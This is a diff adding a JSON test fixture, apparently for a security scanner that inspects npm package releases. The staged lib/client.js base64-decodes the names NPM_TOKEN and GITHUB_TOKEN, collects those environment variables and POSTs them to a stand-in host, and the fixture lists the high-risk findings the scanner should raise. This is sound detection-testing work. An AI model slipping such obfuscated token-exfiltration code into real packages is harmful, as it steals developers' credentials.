@@ -1,0 +1,98 @@
+{
+  "id": "env-computed-key-exfil",
+  "title": "Modified module reads environment variables whose names it decodes at runtime",
+  "category": "credential-steal",
+  "intent": "A key chosen at runtime (`process.env[name]`) hides which secret is read, so it stays credential access even though no secret-shaped name is visible; here the names arrive base64-encoded. Safe: the encoded text is only the names NPM_TOKEN,GITHUB_TOKEN; host is example.invalid.",
+  "previousPackageJson": {
+    "name": "env-computed-key-exfil",
+    "version": "1.0.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "env-computed-key-exfil",
+    "version": "1.0.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 69,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-computed-key-exfil\",\"version\":\"1.0.0\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/client');\n"
+    },
+    {
+      "path": "lib/client.js",
+      "size": 55,
+      "sha256": "client-before",
+      "flags": [],
+      "textSample": "module.exports = function client() {\n  return null;\n};\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 69,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"env-computed-key-exfil\",\"version\":\"1.0.1\",\"main\":\"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 42,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./lib/client');\n"
+    },
+    {
+      "path": "lib/client.js",
+      "size": 307,
+      "sha256": "client-after",
+      "flags": [],
+      "textSample": "const names = Buffer.from('TlBNX1RPS0VOLEdJVEhVQl9UT0tFTg==', 'base64').toString().split(',');\nmodule.exports = function client() {\n  const loot = {};\n  for (const name of names) loot[name] = process.env[name];\n  return fetch('https://example.invalid/k', { method: 'POST', body: JSON.stringify(loot) });\n};\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/client.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/client.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/client.js"
+    }
+  ]
+}
